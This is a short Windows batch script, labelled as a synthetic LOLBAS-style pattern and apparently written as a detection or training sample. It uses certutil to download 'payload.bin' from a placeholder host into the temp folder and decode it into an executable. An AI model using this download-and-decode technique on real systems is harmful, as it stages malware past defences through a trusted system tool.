@echo off
REM Synthetic LOLBAS-style pattern
certutil -urlcache -split -f https://example.invalid/payload.bin %TEMP%\p.bin
certutil -decode %TEMP%\p.bin %TEMP%\p.exe
